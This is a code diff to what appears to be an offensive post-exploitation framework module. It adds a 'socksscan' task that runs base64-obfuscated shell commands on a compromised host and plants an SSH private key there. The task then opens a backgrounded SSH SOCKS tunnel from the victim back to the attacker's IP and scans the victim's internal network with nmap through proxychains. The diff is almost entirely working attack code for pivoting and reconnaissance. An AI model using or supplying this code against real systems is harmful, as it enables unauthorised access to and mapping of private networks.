@@ -23,7 +23,7 @@ class Module(BaseModule):
     ARGUMENTS = {}
 
     def run(self, session: Session):
-        yield Status( "preparing to pwn the [red]world[/red]")
+        session.log("preparing to pwn the [red]world[/red]")
         hostname = session.platform.getenv('HOSTNAME')
         session.log(f'hostname: {hostname}')
         script_dir = os.path.dirname(os.path.realpath(__file__))
@@ -39,6 +39,37 @@ class Module(BaseModule):
                 session.log(result)
             except Exception as e:
                 session.log(f"error: {e}")
+        elif task_name == "socksscan":
+            # PROXYCHAINS_CONF_FILE=./myproxychains.conf
+            # get the attacker public ip
+            result = subprocess.run(['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
+            session.log(f'Attacker IP: {result.stdout}')
+            attacker_ip = result.stdout
+
+            # get the attacker lan
+            payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\'')
+            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+            session.log(f'Target LAN: {result.stdout}')
+            target_lan = result.stdout
+
+            # transfer files from target to attacker
+            session.log("copying private key...")
+            with open(f'/home/socksuser/.ssh/socksuser_key','rb') as f1:
+                with session.platform.open('/tmp/sockskey', 'wb') as f2:
+                    f2.write(f1.read())
+            
+            # start socks proxy via ssh
+            payload = base64.b64encode(f'ssh -q -i /tmp/sockskey -f -N -D 9050 socksuser@{attacker_ip}'.encode())
+            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+            session.log(f'Return Code: {result.returncode}')
+            session.log(f'Output: {result.stdout}')
+            session.log(f'Error Output: {result.stderr}')
+
+            # run nmap scan via proxychains
+            result = subprocess.run(['proxychains', 'nmap', '-Pn', '-p-', target_lan], cwd='/tmp', capture_output=True, text=True)
+            session.log(f'Return Code: {result.returncode}')
+            session.log(f'Output: {result.stdout}')
+            session.log(f'Error Output: {result.stderr}')
         elif task_name == "iam2rds":
             try:
                 session.log(f"setting up templates directory: {script_dir}/../resources")
